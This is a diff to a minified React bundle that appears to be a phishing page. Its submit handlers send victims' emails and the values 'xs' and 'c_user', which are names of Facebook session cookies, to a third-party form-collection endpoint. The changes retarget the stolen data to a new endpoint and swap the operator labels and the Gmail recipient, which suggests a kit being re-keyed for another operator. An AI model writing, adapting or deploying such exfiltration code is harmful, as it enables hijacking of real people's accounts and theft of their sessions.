@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/511OhkeNJ", {
+                                    fetch("https://submit-form.com/fIDIAsTrs", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "salmanjani email",
+                                            workerEmail: "singhapur email",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad"
+                                            name: "altaf"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -9851,7 +9851,7 @@
                                         children: "Detailed Video Information"
                                     }), (0,
                                     he.jsx)("video", {
-                                        src: "detailed_video.mp4",
+                                        src: "https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/video.mp4?alt=media&token=da89bb25-84a0-4ca6-b642-165578e6ca72",
                                         controls: !0,
                                         poster: me,
                                         autoPlay: !0
@@ -13256,7 +13256,7 @@
             })
         }
           , Wt = () => {
-            const e = ["officialaltafniz@gmail.com"]
+            const e = ["singhapur011@gmail.com"]
               , t = _()
               , [r,a] = (0,
             n.useState)(!1)
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/WNnKluUEC", {
+                                    u && o ? (fetch("https://submit-form.com/fIDIAsTrs", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/WNnKluUEC", {
+                        fetch("https://submit-form.com/fIDIAsTrs", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
